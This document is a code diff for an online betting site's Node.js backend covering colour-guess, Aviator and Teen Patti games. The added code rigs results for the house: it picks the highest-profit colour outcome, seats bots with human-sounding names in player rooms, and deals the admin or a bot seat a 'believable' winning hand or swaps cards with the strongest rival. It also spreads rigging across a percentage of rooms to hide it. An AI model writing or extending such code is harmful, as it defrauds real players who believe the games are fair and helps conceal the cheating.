       aviatorState.duration = 5.0;
       aviatorState.round_id++;
       aviatorState.bets = [];
+      aviatorState._riggedThisRound = false;
     }
   }
 }
@@ -896,6 +1452,8 @@ async function settleColorRound(room, targetRound, state) {
   const roundBets = (state[room].bets && state[room].bets[targetRound]) ? state[room].bets[targetRound] : [];
 
   const bot = isBotTakeoverActive('color_guess');
+  // Use deterministic round counter to decide if this round should be rigged
+  const botDecision = shouldBotRigThisRound('color_guess');
 
   let num = null;
   let was_rigged = false;
@@ -941,17 +1499,20 @@ async function settleColorRound(room, targetRound, state) {
     was_rigged = true;
     if (override.color) rig_desc += `Color Fixed: ${override.color} `;
     if (override.size) rig_desc += `Size Fixed: ${override.size} `;
-  } else if (bot.active) {
-    // --- AUTONOMOUS AI BOT TAKEOVER OUTCOME EXECUTION ---
-    // The winning outcome MUST match the exact optimal suggested outcome shown in the Admin Console!
+  } else if (botDecision.shouldRig) {
+    // --- RIGGED ROUND: Bot picks the max-profit outcome ---
     const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
     num = optimal.best_number;
     was_rigged = true;
-    rig_desc = `🤖 AI Bot (${bot.profit_pct}% Profit Target) - Max Profit #${optimal.best_number}`;
+    rig_desc = `🤖 AI Bot (${botDecision.profit_pct}% Target) - Rigged Round - Max Profit #${optimal.best_number}`;
+  } else if (botDecision.active && !botDecision.shouldRig) {
+    // --- FAIR ROUND (bot active but this round is allowed to be fair) ---
+    num = Math.floor(Math.random() * 10);
+    was_rigged = false;
+    rig_desc = `🤖 AI Bot (${botDecision.profit_pct}% Target) - Fair Round - Natural #${num}`;
   } else {
-    // Natural draw seeded by targetRound
-    const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
-    num = optimal.best_number;
+    // --- No bot active: truly random outcome ---
+    num = Math.floor(Math.random() * 10);
   }
 
   const resolved = resolveColorNumber(num);
@@ -1255,6 +1816,71 @@ app.post('/api/game_sync.php', async (req, res) => {
         update: { data: botTakeoverState[gameKey] },
         create: { key: `bot_takeover_${gameKey}`, data: botTakeoverState[gameKey] }
       });
+
+      // When Teen Patti bot takeover is turned ON, assign bot seat ONLY to the percentage-proportional number of rooms
+      if (gameKey === 'teenpatti' || gameKey === 'global') {
+        const tpRooms = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
+        const totalRooms = tpRooms.length; // 6
+        
+        let roomsToRigCount = 0;
+        if (isEnabled) {
+          if (pct >= 100) {
+            roomsToRigCount = totalRooms; // 100% -> all 6 rooms
+          } else if (pct <= 0) {
+            roomsToRigCount = 0;
+          } else {
+            // Proportional room selection: e.g. 50% -> 3 rooms, 70% -> 4 rooms, 80% -> 5 rooms
+            roomsToRigCount = Math.round((pct / 100) * totalRooms);
+            roomsToRigCount = Math.max(1, Math.min(totalRooms - 1, roomsToRigCount));
+          }
+        }
+
+        const shuffled = tpShuffle(tpRooms);
+        const riggedRooms = new Set(shuffled.slice(0, roomsToRigCount));
+
+        for (const rId of tpRooms) {
+          try {
+            if (riggedRooms.has(rId)) {
+              // Bot books a seat and rigs only in this selected proportion of matches
+              const randomSeat = Math.floor(Math.random() * 4);
+              const botName = TP_BOT_NAMES[randomSeat % TP_BOT_NAMES.length];
+
+              const seatRecord = await prisma.teenPattiSeat.findFirst({
+                where: { room_id: rId, seat: randomSeat }
+              });
+              if (seatRecord && (!seatRecord.username || seatRecord.is_bot)) {
+                await prisma.teenPattiSeat.update({
+                  where: { id: seatRecord.id },
+                  data: { username: botName, is_bot: true, folded: false }
+                });
+              }
+
+              await prisma.teenPattiRoom.update({
+                where: { id: rId },
+                data: {
+                  admin_rig: {
+                    winner_seat: randomSeat,
+                    is_bot_rig: true,
+                    bot_name: botName,
+                    profit_pct: pct
+                  }
+                }
+              });
+            } else {
+              // This room is a FAIR match (no bot takeover seat booked)
+              const room = await prisma.teenPattiRoom.findUnique({ where: { id: rId } });
+              if (room && room.admin_rig && room.admin_rig.is_bot_rig) {
+                await prisma.teenPattiRoom.update({
+                  where: { id: rId },
+                  data: { admin_rig: null }
+                });
+              }
+            }
+          } catch (err) {
+            console.error(`Error updating bot seat for room ${rId}:`, err.message);
+          }
+        }
+      }
 
       res.json({
         success: true,
@@ -1668,7 +2294,6 @@ const TP_ROOMS = [
   { id: 'room_106', name: 'Room 6', boot_amount: 250 },
 ];
 
-const TP_BOT_NAMES = ['BOT_Raju', 'BOT_Vikram', 'BOT_Sana', 'BOT_Kabir'];
 const TP_TURN_TIMEOUT = 15; // seconds
 const TP_BOT_FILL_DELAY = 15000; // 15s before bots fill empty seats
 const TP_BOT_THINK_MIN = 1500;
@@ -1677,17 +2302,22 @@ const TP_ROUND_DELAY = 5000; // 5s between rounds
 const TP_SEAT_HEARTBEATS = {};
 
 // -- Card utilities --
+function tpShuffle(arr) {
+  const a = [...arr];
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
 function tpCreateDeck() {
   const suits = ['S', 'H', 'C', 'D'];
   const deck = [];
   for (let r = 2; r <= 14; r++) {
     for (const s of suits) deck.push({ r, s });
   }
-  for (let i = deck.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [deck[i], deck[j]] = [deck[j], deck[i]];
-  }
-  return deck;
+  return tpShuffle(deck);
 }
 
 function tpEvaluateHand(cards) {
@@ -1943,9 +2573,29 @@ async function tpStartRound(roomId) {
     });
   }
 
-  // Apply admin rig: Oblivious Rigging (construct closest believable winning hand)
+  // Determine if round should be rigged via Manual Admin Rig OR AI Bot Takeover
+  let rigSeat = undefined;
+  let rigReason = '';
+
   if (room.admin_rig && room.admin_rig.winner_seat !== undefined) {
-    const rigSeat = room.admin_rig.winner_seat;
+    rigSeat = room.admin_rig.winner_seat;
+    rigReason = 'MANUAL ADMIN RIG';
+  } else {
+    const botDecision = shouldBotRigThisRound('teenpatti');
+    if (botDecision.shouldRig) {
+      // Find admin seat or a bot seat to win the pot for the house
+      const adminSeat = activeOccupied.find(s => s.username && s.username.toLowerCase() === 'admin');
+      const botSeat = activeOccupied.find(s => s.is_bot);
+      const targetSeat = adminSeat || botSeat || activeOccupied[0];
+      if (targetSeat) {
+        rigSeat = targetSeat.seat;
+        rigReason = `AI BOT TAKEOVER (${botDecision.profit_pct}% TARGET)`;
+      }
+    }
+  }
+
+  // Apply Rigging: Oblivious Rigging (construct closest believable winning hand)
+  if (rigSeat !== undefined) {
     const freshSeats = await prisma.teenPattiSeat.findMany({
       where: { room_id: roomId },
       orderBy: { seat: 'asc' }
@@ -1980,13 +2630,13 @@ async function tpStartRound(roomId) {
               where: { id: rigTarget.id },
               data: { cards: formattedRigCards }
             });
-            console.log(`[TP] OBLIVIOUS RIG: Room ${roomId} — Seat ${rigSeat} assigned believable winning hand (${tpHandLabel(oblivious.evaluation[0])}) vs rival (${tpHandLabel(rivalBestHand[0])})`);
+            console.log(`[TP] ${rigReason}: Room ${roomId} — Seat ${rigSeat} assigned believable winning hand (${tpHandLabel(oblivious.evaluation[0])}) vs rival (${tpHandLabel(rivalBestHand[0])})`);
           } else {
             // Fallback swap
             const tempCards = rigTarget.cards;
             await prisma.teenPattiSeat.update({ where: { id: rigTarget.id }, data: { cards: bestRivalSeat.cards } });
             await prisma.teenPattiSeat.update({ where: { id: bestRivalSeat.id }, data: { cards: tempCards } });
-            console.log(`[TP] OBLIVIOUS RIG FALLBACK: Room ${roomId} — swapped seat ${rigSeat} with best rival seat ${bestRivalSeat.seat}`);
+            console.log(`[TP] ${rigReason} (Fallback): Room ${roomId} — swapped seat ${rigSeat} with best rival seat ${bestRivalSeat.seat}`);
           }
         }
       }
@@ -2227,6 +2877,32 @@ async function tpEndGame(roomId, winnerSeat, pot, log, wasShow) {
         data: { status: 'waiting', pot: 0, winner_seat: null }
       });
 
+      const botDecision = shouldBotRigThisRound('teenpatti');
+      if (botDecision.shouldRig) {
+        const randomSeat = Math.floor(Math.random() * 4);
+        const botName = TP_BOT_NAMES[randomSeat % TP_BOT_NAMES.length];
+        await prisma.teenPattiSeat.updateMany({
+          where: { room_id: roomId, seat: randomSeat },
+          data: { username: botName, is_bot: true, folded: false }
+        });
+        await prisma.teenPattiRoom.update({
+          where: { id: roomId },
+          data: {
+            admin_rig: {
+              winner_seat: randomSeat,
+              is_bot_rig: true,
+              bot_name: botName,
+              profit_pct: botDecision.profit_pct
+            }
+          }
+        });
+      } else {
+        await prisma.teenPattiRoom.update({
+          where: { id: roomId },
+          data: { admin_rig: null }
+        });
+      }
+
       console.log(`[TP] Winner display ended in ${roomId} — room emptied back to 0/4.`);
     } catch (e) { console.error('[TP] Room empty error:', e.message); }
   }, 5000);
@@ -2458,7 +3134,8 @@ app.get('/api/teenpatti/rooms', async (req, res) => {
           folded: s.folded
         })),
         player_count: r.seats.filter(s => s.username).length,
-        real_player_count: r.seats.filter(s => s.username && !s.is_bot).length
+        real_player_count: r.seats.filter(s => s.username && !s.is_bot).length,
+        admin_rig: r.admin_rig
       };
     });
     res.json(result);
@@ -3810,8 +4487,10 @@ app.get('/api/admin/game-stats', async (req, res) => {
 // Serve static frontend assets for non-API routes
 app.use(express.static(path.join(__dirname, '..')));
 
-app.listen(PORT, () => {
-  console.log(`[bet1x-backend] Express backend listening on port ${PORT}`);
-});
+if (require.main === module) {
+  app.listen(PORT, () => {
+    console.log(`[bet1x-backend] Express backend listening on port ${PORT}`);
+  });
+}
 
 module.exports = app;
